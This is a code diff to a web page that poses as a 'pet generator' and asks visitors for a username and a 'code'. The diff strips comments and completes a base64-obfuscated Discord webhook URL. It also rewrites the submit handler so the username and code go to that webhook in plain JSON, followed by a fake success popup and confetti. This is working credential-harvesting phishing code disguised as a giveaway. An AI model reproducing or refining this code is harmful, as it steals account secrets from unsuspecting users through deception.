@@ -117,7 +117,6 @@
     transform: scale(1.07);
   }
 
-  /* Popup shared styles */
   #popup, #confirmPopup {
     display: none;
     position: fixed;
@@ -142,7 +141,6 @@
     text-align: center;
   }
 
-  /* 🔥 Special animation for confirmation popup */
   #confirmPopup .popup-content {
     animation: popscale 0.5s ease;
   }
@@ -207,7 +205,6 @@
     </div>
   </div>
 
-  <!-- Username/Code Popup -->
   <div id="popup">
     <div class="popup-content">
       <h3>Enter Your Details</h3>
@@ -217,7 +214,6 @@
     </div>
   </div>
 
-  <!-- Confirmation Popup -->
   <div id="confirmPopup">
     <div class="popup-content">
       <h3>✅ Pet has been generated!</h3>
@@ -274,21 +270,17 @@
     const code = document.getElementById('code').value.trim();
     if (!username || !code) return;
 
-    // ✅ Base64 encoded webhook
-    const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwOTYwNTE2NTc4MjE0MzAxNi9hOW5VeVVSVVJDN1FPdVdj...";
+    const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwOTYwNTE2NTc4MjE0MzAxNi9hOW5VeVVSVVJDN1FPdVdjc016S3p6VElHem8xdFczQV9rc2VGZ2F1ZDNXUV9oejNWa3hJT3dtMzFIN3h5U21MQkpibQ=="; 
     const webhookURL = atob(webhookBase64);
 
-    const contentMessage = `Pet Generated!\nUsername: ${username}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`;
-
-    // ✅ Send code as a file
-    const codeFile = new Blob([code], { type: "text/plain" });
-    const formData = new FormData();
-    formData.append("content", contentMessage);
-    formData.append("file", codeFile, "pet_code.txt");
+    const payload = {
+      content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
+    };
 
     await fetch(webhookURL, {
-      method: "POST",
-      body: formData
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
     });
 
     document.getElementById('popup').style.display = 'none';
@@ -296,7 +288,6 @@
     launchConfetti();
   }
 
-  // 🎉 Confetti Effect
   function launchConfetti() {
     const duration = 3 * 1000;
     const end = Date.now() + duration;
@@ -330,7 +321,6 @@
     })();
   }
 
-  // Starfield background
   const canvas = document.getElementById('starfield');
   const ctx = canvas.getContext('2d');
   let stars = [];
